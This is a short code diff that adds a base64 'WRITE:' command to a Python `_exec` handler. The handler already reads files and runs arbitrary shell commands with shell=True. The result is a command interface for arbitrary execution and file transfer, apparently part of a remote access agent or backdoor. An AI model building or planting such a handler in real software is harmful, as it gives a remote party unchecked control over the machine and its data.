@@ -378,6 +378,17 @@ def _exec(cmd: str) -> str:
                 return base64.b64encode(f.read()).decode()
         except Exception as e:
             return f"[error: {e}]"
+    if cmd.startswith("WRITE:"):
+        rest  = cmd[6:]
+        sep   = rest.index(":")
+        path  = rest[:sep]
+        try:
+            data = base64.b64decode(rest[sep + 1:])
+            with open(path, "wb") as f:
+                f.write(data)
+            return f"written {len(data)} bytes to {path}"
+        except Exception as e:
+            return f"[error: {e}]"
     try:
         r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
         return (r.stdout + r.stderr) or "[no output]"
